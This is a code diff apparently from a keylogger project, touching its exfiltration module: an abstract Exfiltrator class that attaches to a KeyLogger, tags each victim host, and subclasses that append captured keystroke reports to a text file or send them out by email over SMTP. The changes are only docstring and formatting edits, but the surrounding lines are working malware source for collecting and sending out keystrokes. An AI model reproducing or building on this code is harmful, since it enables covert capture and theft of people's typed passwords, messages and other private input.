@@ -19,10 +19,18 @@ from keylogger import KeyLogger
 
 class Exfiltrator(abc.ABC):
     def __init__(self, keylogger: KeyLogger, tag: str):
+        """Interface for the implementation of all exfiltrators.
+
+        Args:
+            keylogger (KeyLogger): Instance to which the exfiltrator
+                will attach itself to as a subscriber.
+            tag (str): A unique identifier for the current host.
+                Defaults to a string with a format similar to
+                KeyLogger::Discord::computer001 if None.
+        """
+
         self.keylogger = keylogger
         self.keylogger.register_exfiltrator(self)
-        '''The self.tag attribute defaults to a formatting similar to
-        KeyLogger::Discord::computer001 if tag is None'''
         self.tag = tag if tag is not None else \
             f"{self.keylogger.__class__.__name__}::" \
             f"{self.__class__.__name__}::" \
@@ -32,7 +40,6 @@ class Exfiltrator(abc.ABC):
     def report(self) -> str:
         """Get a report based on the data buffered by the keylogger as
         a string consisting of a tag, timestamp and the data itself."""
-
         timestamp = datetime.now().strftime("%m/%d/%Y %H:%M:%S")
         header = f"[{self.tag}] @ {timestamp}"
         '''The standard report is formatted as follows:
@@ -68,7 +75,7 @@ class TextFile(Exfiltrator):
         self.file_path = file_path
 
     def update(self) -> None:
-        """Write each report on a new line of text file with the
+        """Write each report on a new line of a text file with the
         specified path."""
         if self.keylogger.has_data:
             with open(file=self.file_path, mode="a", encoding="utf_8") as file:
@@ -90,6 +97,8 @@ class Email(Exfiltrator):
         self.password = password
 
     def update(self):
+        """Send each report as an email through a secure connection
+        using SMTP"""
         if self.keylogger.has_data:
             with smtplib.SMTP_SSL(
                     host=self.smtp_host,
